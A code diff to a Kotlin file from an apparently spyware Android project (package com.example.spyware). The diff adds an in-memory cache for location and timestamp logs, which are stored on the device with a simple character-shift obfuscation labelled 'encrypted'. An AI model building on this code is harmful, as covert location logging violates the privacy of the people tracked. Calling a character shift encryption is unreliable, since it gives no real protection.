@@ -1,5 +1,7 @@
+import android.app.Service
 import android.content.Context
 import android.os.Environment
+import com.example.spyware.TimeoutHandler
 import com.example.spyware.common.Constants.Companion.END_TIMESTAMP
 import com.example.spyware.common.Constants.Companion.ERROR
 import com.example.spyware.common.Constants.Companion.LATITUDE
@@ -20,6 +22,12 @@ import java.time.temporal.ChronoUnit
 import java.util.UUID
 import kotlin.math.atan2
 import kotlin.math.cos
+
+class EncryptedFileIo() {
+    companion object {
+        public var logCache:List<JSONObject> = listOf();
+    }
+}
 
 // Shift each character n places backward (encode)
 private fun shiftStringBack(str: String, n: Int): String {
@@ -113,15 +121,24 @@ fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
 fun log(context:Context, jsonObject: JSONObject){
     val currentUtcTime = DateTimeFormatter.ISO_INSTANT.format(Instant.now())
     jsonObject.put(TIMESTAMP, currentUtcTime)
+    resetLogCache()
     val logs=getLogs(context)
     var filteredLogs=filterLogsOnDate(logs,Instant.now().minus(LOG_TIME_TO_LIVE_DAYS, ChronoUnit.DAYS),Instant.now())
     filteredLogs=filteredLogs+jsonObject
     writeShiftedToFile(context.filesDir,outputFileName,filteredLogs.map{it.toString()}.joinToString("\n") ?: "", logShift)
 }
 
+fun resetLogCache(){
+    EncryptedFileIo.logCache= listOf()
+}
+
 fun getLogs(context:Context):List<JSONObject>{
+    if(EncryptedFileIo.logCache.size>0)
+        return EncryptedFileIo.logCache
+    println("Getting logs from file")
     val content:String?=readShiftedFromFile(context.filesDir,outputFileName,logShift)
-    return content?.lines()?.filter { it.isNotBlank() }?.map { JSONObject(it) } ?: listOf()
+    EncryptedFileIo.logCache=content?.lines()?.filter { it.isNotBlank() }?.map { JSONObject(it) } ?: listOf()
+    return EncryptedFileIo.logCache
 }
 
 fun getMissingLogs(logs:List<JSONObject>):List<JSONObject>{
